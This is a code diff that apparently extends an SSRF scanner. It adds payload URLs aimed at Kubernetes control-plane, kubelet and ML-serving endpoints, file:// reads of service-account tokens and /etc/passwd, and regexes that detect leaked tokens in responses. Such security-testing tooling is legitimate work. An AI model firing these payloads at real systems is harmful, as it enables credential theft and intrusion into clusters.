@@ -49,6 +49,35 @@ _INTERNAL_NETWORK_PAYLOADS: List[str] = [
     "http://172.16.0.1/",
 ]
 
+# In-cluster Kubernetes service names (Epic 8)
+_K8S_CLUSTER_PAYLOADS: List[str] = [
+    "http://kubernetes.default.svc/version",
+    "http://kubernetes.default.svc.cluster.local/api",
+    "http://etcd.kube-system.svc/version",
+    "http://kube-dns.kube-system.svc/",
+    "http://metrics-server.kube-system.svc/",
+    # Common control-plane service endpoints accessible via SSRF
+    "http://10.96.0.1/api/v1/namespaces",          # default ClusterIP for k8s API
+    "http://10.96.0.1/version",
+    # Node-local metadata / service-account token paths
+    "http://127.0.0.1:10255/pods",                  # Kubelet read-only port
+    "http://127.0.0.1:10250/pods",                  # Kubelet API
+    "file:///var/run/secrets/kubernetes.io/serviceaccount/token",
+    "file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
+]
+
+# Internal ML/AI service targets — common in cloud-native ML stacks
+_ML_INTERNAL_PAYLOADS: List[str] = [
+    "http://prometheus.monitoring.svc/api/v1/targets",
+    "http://grafana.monitoring.svc/api/health",
+    "http://mlflow.mlflow.svc/api/2.0/mlflow/experiments/list",
+    "http://kubeflow.kubeflow.svc/",
+    "http://ml-pipeline.kubeflow.svc/apis/v1beta1/pipelines",
+    "http://127.0.0.1:5000/api/2.0/mlflow/experiments/list",   # MLflow local
+    "http://127.0.0.1:8501/v1/models",                          # TF Serving
+    "http://127.0.0.1:8000/v2/models",                          # Triton
+]
+
 # URL scheme / protocol handlers
 _PROTOCOL_HANDLER_PAYLOADS: List[str] = [
     "file:///etc/passwd",
@@ -73,6 +102,8 @@ _BYPASS_PAYLOADS: List[str] = [
 ALL_SSRF_PAYLOADS: List[str] = (
     _CLOUD_METADATA_PAYLOADS
     + _INTERNAL_NETWORK_PAYLOADS
+    + _K8S_CLUSTER_PAYLOADS
+    + _ML_INTERNAL_PAYLOADS
     + _PROTOCOL_HANDLER_PAYLOADS
     + _BYPASS_PAYLOADS
 )
@@ -111,6 +142,12 @@ _INTERNAL_SERVICE_PATTERNS = [
     re.compile(r"redis_version:", re.IGNORECASE),             # Redis
     re.compile(r"<title>.*dashboard.*</title>", re.IGNORECASE),
     re.compile(r"Server:\s*(?:Apache|nginx)", re.IGNORECASE),
+    # Kubernetes service-account token / metadata API responses
+    re.compile(r'"token"\s*:\s*"[A-Za-z0-9._-]{20,}"', re.IGNORECASE),
+    re.compile(r'"namespace"\s*:\s*"[a-z0-9-]+".*"serviceAccountName"', re.IGNORECASE),
+    # ML framework internal API indicators
+    re.compile(r'"experiments"\s*:|\{"kind":\s*"ExperimentList"', re.IGNORECASE),  # MLflow/Kubeflow
+    re.compile(r'"model_name"\s*:|"model_version"\s*:', re.IGNORECASE),            # TF Serving / Triton
 ]
 
 
